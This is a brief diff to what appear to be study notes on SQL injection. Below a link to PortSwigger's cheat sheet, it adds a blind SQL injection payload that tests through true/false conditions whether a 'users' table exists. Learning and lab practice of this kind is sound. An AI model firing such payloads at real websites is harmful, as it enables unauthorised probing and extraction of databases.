@@ -14,3 +14,8 @@ etc.
 
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
+
+BLIND SQL INJECTION
+true and false condition based check if "users" table exist
+
+s7YSGusXA8EbL4Pt' and (select 'a' from users limit 1)='a'--
